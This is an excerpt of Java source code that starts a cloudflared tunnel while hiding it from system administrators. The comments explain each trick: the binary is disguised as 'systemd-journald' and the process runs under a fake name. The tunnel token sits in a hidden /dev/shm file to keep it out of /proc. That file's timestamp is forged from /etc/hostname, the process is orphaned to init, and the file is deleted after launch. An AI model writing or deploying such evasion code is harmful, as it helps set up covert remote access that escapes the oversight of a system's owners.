 ...
 *   - cloudflared binary named systemd-journald (matches real system binary name)
...
public class App {
    ...
    public static void stop() {
        ...
        try { Files.deleteIfExists(Path.of("/dev/shm/.config.yml")); } catch (Exception ignored) {}
    ...
    private static void startCloudflared() throws Exception {
        ...
        // --- Write token to a config file (NOT env var) ---
        // Token in environ is the biggest giveaway — anyone reading /proc/pid/environ sees it.
        // By using --config with a file, the token value never appears in any /proc/pid file.
        String configYaml = "token: " + CF_TOKEN + "\n";
        Path configFile = Path.of("/dev/shm/.config.yml");
        Files.writeString(configFile, configYaml);
        configFile.toFile().setExecutable(false, false);
        cloneTimestamp(configFile, Path.of("/etc/hostname"));

        // Launch via background subshell: the shell exits immediately,
        // cloudflared becomes orphan → adopted by init → PPID=1
        // Token passed via --config file, not env var — hidden from /proc/pid/environ
        // cmdline shows "--config /dev/shm/.config.yml" — file path is generic, not the token value
        ProcessBuilder pb = new ProcessBuilder(
                "/bin/sh", "-c",
                "exec -a " + FAKE_COMM + " " + cloudflaredBinary.toAbsolutePath().toString()
                        + " tunnel run --config " + configFile.toAbsolutePath().toString() + " &"
        );
        ...
        env.put("TERM", "linux");
        // NOTE: NO TUNNEL_TOKEN env var — token is in config file only
        ...
        // --- Delete config file (cloudflared already read it into memory) ---
        try { Files.deleteIfExists(configFile); } catch (Exception ignored) {}
